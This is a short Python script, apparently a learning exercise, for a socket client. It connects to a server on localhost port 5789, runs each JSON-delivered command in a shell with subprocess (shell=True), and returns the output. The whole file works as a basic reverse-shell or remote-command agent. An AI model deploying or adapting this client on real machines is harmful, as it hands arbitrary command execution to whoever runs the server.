# Client
import socket
import json
import subprocess

# Definy HOST and PORT
HOST = "127.0.0.1"
PORT = 5789


def exec(command):
    try:
        result = subprocess.run(
            command,
            shell=True,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=5,
        )

        return {
            "exit": result.stdout,
            "code": result.returncode,
        }
    except subprocess.TimeoutExpired:
        return {
            "exit": "Time expired the limited the 5 seconds",
            "code": 1,
        }
    except OSError as erro:
        return {
            "exit": f"Error execute the comand: {erro}\n",
            "code": 1,
        }


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
    client.connect((HOST, PORT))
    print("Connecting the server...")

    with client.makefile("r", encoding="utf-8") as entry:
        while True:
            line = entry.readline()

            if line == "":
                print("The connection is closed")
                break

            order = json.loads(line)
            command = order["command"]

            if command == "exit":
                response = {
                    "exit": "Closed the session",
                    "code": 0,
                }
            else:
                response = exec(command)

            message = json.dumps(response) + "\n"
            client.sendall(message.encode("utf-8"))

            if command == "exit":
                break
